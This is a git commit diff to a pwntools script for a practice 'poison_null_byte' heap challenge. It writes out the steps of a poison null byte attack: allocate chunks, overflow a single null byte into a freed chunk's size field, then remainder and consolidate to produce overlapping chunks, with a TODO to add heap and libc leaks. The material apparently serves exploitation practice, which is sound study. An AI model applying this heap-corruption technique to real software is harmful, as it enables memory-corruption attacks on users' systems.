315ee43430768462f59058ae5a056591524b8c8f
bu6hunt3r <bu6hunt3r@web.de>
2022-01-28 15:26:18 +0100

    TODO: Leverage heap and libc leaks in challenge

--- challenge-poison_null_byte/pwntools_poison_nullbyte.py
+++ challenge-poison_null_byte/pwntools_poison_nullbyte.py
@@ -1,4 +1,4 @@
-#!/usr/bin/python3
+#!/usr/bin/env python3
 from pwn import *
 
 elf = context.binary = ELF("poison_null_byte")
@@ -52,21 +52,33 @@ io.recvuntil(b"> ")
 io.timeout = 0.1
 
 # =============================================================================
+#
+# =-=-=- CREATE OVERLAPPING CHUNKS =-=-=-
+#
+# Request 4 chunks.
+overflow = malloc(0x88) # Overflow from this chunk to succeeding chunk's size field
+victim = malloc(0x208) # Victim of single null-byte overflow
+consolidate = malloc(0x88) # Free this chunk to consolidate over the "victim" chunk
+guard = malloc(0x18) # Guard against consolidation with top chunk.
 
-# =-=-=- EXAMPLE -=-=-=
+# Free the victim chunk into the unsortedbin.
+free(victim)
 
-# Request 2 chunks.
-chunk_A = malloc(0x88)
-chunk_B = malloc(0x88)
+# Overflow the victim's prev_size bit to scrub 16 bytes from it's size later on
+edit(overflow, b"Y"*0x88)
 
-# Edit "chunk_A".
-edit(chunk_A, b"Y"*8)
+# Request two 0x100 sized chunks in order to remainder "victim" chunk
+# Succeeding chunk's size field is not updated because victim chunk appears
+# to be 0x10 bytes smaller.
+victim_1 = malloc(0xf8)
+victim_2 = malloc(0xf8)
 
-# Read from "chunk_A".
-info(f"{read(chunk_A, 8)}")
+# Free victim_1 into unsortedbin.
+free(victim_1)
 
-# Free "chunk_A".
-free(chunk_A)
+# Free the "consolidate" chunk succeeding victim_2 in order to consolidate
+# it backwards with victim_1 over victim_2
+free(consolidate)
 
 # =============================================================================
 
